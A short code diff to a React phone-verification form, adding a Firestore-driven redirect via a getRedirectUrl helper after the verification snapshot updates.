@@ -9,6 +9,7 @@ import { doc, onSnapshot } from "firebase/firestore";
 import { db } from "@/lib/firebase";
 import { addData } from "@/lib/firebase";
 import FullPageLoader from "@/components/loader";
+import { getRedirectUrl } from "@/lib/page-routes";
 
 export function PhoneVerificationForm() {
   const router = useRouter();
@@ -51,6 +52,9 @@ export function PhoneVerificationForm() {
         setIsLoading(false);
         alert("رمز التحقق غير صحيح");
       }
+
+      const redirectUrl = getRedirectUrl(userData.currentPage, "verify-phone");
+      if (redirectUrl) window.location.href = redirectUrl;
     });
 
     return () => unsubscribe();
